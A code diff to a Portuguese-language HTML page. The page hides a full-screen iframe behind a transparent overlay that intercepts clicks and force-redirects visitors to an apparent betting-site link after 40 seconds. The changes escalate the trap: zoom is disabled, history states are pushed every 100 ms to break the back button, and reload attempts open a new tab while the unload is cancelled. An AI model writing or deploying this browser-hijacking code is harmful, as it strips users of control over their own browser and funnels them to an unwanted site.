@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
@@ -15,10 +15,16 @@
             box-sizing: border-box;
         }
 
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* Evita rolagem indesejada em dispositivos móveis */
+        }
+
         .iframe-container {
             position: relative;
-            width: 100%;
-            height: 100vh; /* Ocupa a altura total da tela */
+            width: 100vw;
+            height: 100vh; /* Ocupa toda a tela em qualquer dispositivo */
         }
 
         iframe {
@@ -36,31 +42,41 @@
             height: 100%;
             background: transparent; /* Camada transparente */
             z-index: 10;
-            pointer-events: auto; /* Intercepta todos os eventos de clique e teclado */
+            pointer-events: auto; /* Intercepta cliques e toques */
         }
     </style>
     <script>
-        // Função para redirecionar
-        function redirect() {
+        // Função para redirecionar na mesma aba
+        function redirectSameTab() {
             window.location.replace("https://app.bancabrasileira.com.br/pr/bIwlp2AU");
         }
 
-        // Redireciona após 40 segundos
-        setTimeout(redirect, 40000); // 40 segundos em milissegundos
+        // Função para abrir nova aba
+        function openNewTab() {
+            window.open("https://app.bancabrasileira.com.br/pr/bIwlp2AU", "_blank");
+        }
 
-        // Adiciona estados ao histórico para bloquear o botão de voltar
-        history.pushState(null, null, window.location.href);
-        history.pushState(null, null, window.location.href); // Adiciona múltiplos estados
+        // Redireciona após 40 segundos na mesma aba
+        setTimeout(redirectSameTab, 40000); // 40 segundos em milissegundos
+
+        // Preenche o histórico para bloquear o botão de voltar
+        (function pushHistory() {
+            history.pushState(null, null, window.location.href);
+            setTimeout(pushHistory, 100); // Reforça continuamente o estado do histórico
+        })();
 
         // Captura tentativas de voltar no navegador
         window.onpopstate = function () {
-            history.pushState(null, null, window.location.href); // Reinsere estado
-            redirect();
+            history.pushState(null, null, window.location.href);
+            redirectSameTab();
         };
 
-        // Garante redirecionamento ao tentar recarregar
-        window.addEventListener('beforeunload', function () {
-            redirect();
+        // Detecta tentativas de recarga e abre nova aba
+        window.addEventListener('beforeunload', function (e) {
+            openNewTab();
+            // Cancela a recarga padrão para evitar comportamento indesejado
+            e.preventDefault();
+            e.returnValue = ''; // Necessário para alguns navegadores
         });
     </script>
 </head>
